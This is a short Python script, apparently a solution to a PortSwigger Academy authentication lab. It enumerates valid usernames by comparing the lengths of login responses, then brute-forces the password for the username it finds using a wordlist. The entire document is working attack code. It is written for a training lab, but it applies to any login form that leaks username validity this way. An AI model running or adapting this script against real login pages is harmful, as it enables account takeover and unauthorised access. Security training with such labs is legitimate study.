#!/usr/bin/python3

import requests

PROLOGUE = '''The purpose of this exploit is to find valid user credentials
by analyzing the differences between responses and then perform a brute force
attack,
to solve the first Authentication lab of the PortSwigger Academy.

Copyright (c) 2023 Carmelo Ballone a.k.a. Hackt4rus

'''

# Change the URL with the one you get when you access the lab
URL = "YOUR URL HERE"
usernames_list_path = './candidate_usernames.txt'
passwords_list_path = './candidate_passwords.txt'

def find_username():
    global URL, usernames_list_path
    r = requests.post(URL, data={'username': 'username', 'password': 'aaa'})
    session = r.cookies['session']
    length = len(r.content)
    with open(usernames_list_path, 'r') as usernames:
        for username in usernames:
            usr = username.strip()
            print(f"[*] Trying {usr} username...\n")
            current_request = requests.post(URL, cookies={'session': session}, data={'username': usr, 'password': 'aaa'})
            if len(current_request.content) != length:
                print("[*****] Found: ", usr, '\n\n')
                return usr

    print("[x] No valid username found.")
    return 
        
def find_password(username):
    global URL, password_list_path
    r = requests.post(URL, data={'username': username, 'password': 'aaa'})
    session = r.cookies['session']
    length = len(r.content)
    with open(passwords_list_path, 'r') as passwords:
        for password in passwords:
            psw = password.strip()
            print(f"[*] Trying {username}:{psw} ...\n")
            current_request = requests.post(URL, cookies={'session': session}, data={'username': username, 'password': psw})
            if len(current_request.content) != length:
                print(f"[*****] Found credentials:        {username}:{psw}")
                return
    print("[x] No correct password found.")
    return
            

if __name__ == '__main__':
    print(PROLOGUE)
    find_password(find_username())
            
            

